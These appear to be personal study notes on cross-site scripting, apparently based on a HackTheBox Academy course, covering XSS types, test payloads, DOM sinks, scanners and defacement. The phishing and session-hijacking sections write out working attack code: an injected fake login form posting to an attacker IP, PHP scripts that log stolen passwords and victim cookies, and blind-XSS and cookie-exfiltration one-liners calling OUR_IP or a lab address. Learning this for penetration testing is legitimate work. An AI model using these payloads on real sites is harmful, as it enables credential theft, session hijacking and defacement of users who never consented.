## Types of XSS
| Type                           | Description                                                                                                                                                                                                                                  |
|--------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Stored (Persistent) XSS        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                   |
| Reflected (Non-Persistent) XSS | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                 |
| DOM-based XSS                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |

## Stored XSS

The stored xss is the most critical because it is persistent and normally executed by anyone who is rendering the webpage.
Some basic payloads to test for XSS are:
- `<plaintext>`
- `<script>print()</script>`
- `<script>alert(window.origin)</script>`

To access aa cookie we can use the following payload: `<script>alert(document.cookie)</script>`

## Reflected XSS

The reflected XSS vulnerability its normally processed by the server and returned in form of an error for example.
Its is not persistent and to target a user we simply send the url the reproduces the exploit.

## DOM-based XSS

The DOM-based XSS its a client side not persistent vulnerability that its presented in the javascript code that uses the user input to show some content in the webpage.
If it is not sanitized and placed directly it can create a DOM-based XSS. 

Some of the commonly used **JavaScript** functions to write to DOM objects are:

- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Furthermore, some of the **jQuery** library functions that write to DOM objects are:

- `add()`
- `after()`
- `append()`

The innerHTML function does not allow the use of `<script>` so we need to execute a different payload:

```html
<img src="" onerror=alert(window.origin)>
```

In order to use the vulnerability with any user we need to share the URL.

## Automated Discovery 

We can use open source tools to help us in discovery XSS vulnerabilities. 
They can either execute a **passive scan** which will scan form DOM-based vulnerabilities using the javascript source code or **active scan** which will try different payloads and check if the rendered page has the payload inserted.

Some of the tools are:
- [XSS Strike](https://github.com/s0md3v/XSStrike)
- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
- [XSSer](https://github.com/epsylon/xsser)

## Defacing

Defacing is a technique used to leverage the XSS vulnerability found and change the contents of a webpage.
Defacing is widely used by hackers to announce that they hack a certain website.
When a stored XSS vulnerability is found a couple of elements we can use in our payload to change the webpage:
- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

An example would be: `<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>`

## Phishing 

Another common use of XSS vulnerabilities is phishing. Once a XSS vulnerability is found, an attacker can rebuild the website and create a fake login redirecting the credentials to a server he controls. The steps to achieve that are:
- XSS Discovery: Using the tools we have tried we discover a XSS vulnerability.
- Login form injection: Create a fake login form that sends the requests to a server. We can use `document.write()` for this.

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

- cleanup the webpage: We want the user to focus on the login page, so we remove the rest of the functionality with `document.getElementById('urlform').remove();`. We can use the `Page Inspector Picker` to get the id.

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

- Credential stealing: In order to receive the request we can setup a simple netcat listener, `sudo nc -lvnp 80`, or develop a simple php server that receives the request, save the credentials in a file and then redirects to the webpage.

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```

## Hijacking Session 

The same way we get the user credentials we can steal a cookie after finding a XSS vulnerability.
To do so we have a couple prebuilt exploits here: [](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc).

However in some cases we don't have access to some platforms/pages and we can confirm that our exploit work. 
That's called Blind XSS. In addition to that we can have multiple inputs that we want to test and to know what are vulnerable we need to find strategies.
One of them is to specify in the exploit the input id or a reference to the input we are trying to exploit.
Example: 
```javascript
<script src="http://YOUR_IP/username"></script>
<script src="http://YOUR_IP/name"></script>
```

Exploits we can try, here: [](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)

```html
<script src=http://10.10.15.79:9000/name></script>
'><script src=http://10.10.15.79:9000/username></script>
"><script src=http://10.10.15.79:9000/profilepic></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

```
"><script src=http://10.10.15.79:9000/script.js></script>
```

Once we found the input, we just need to start the php server and send an exploit that grabs the user cookie.

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Exploits:
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
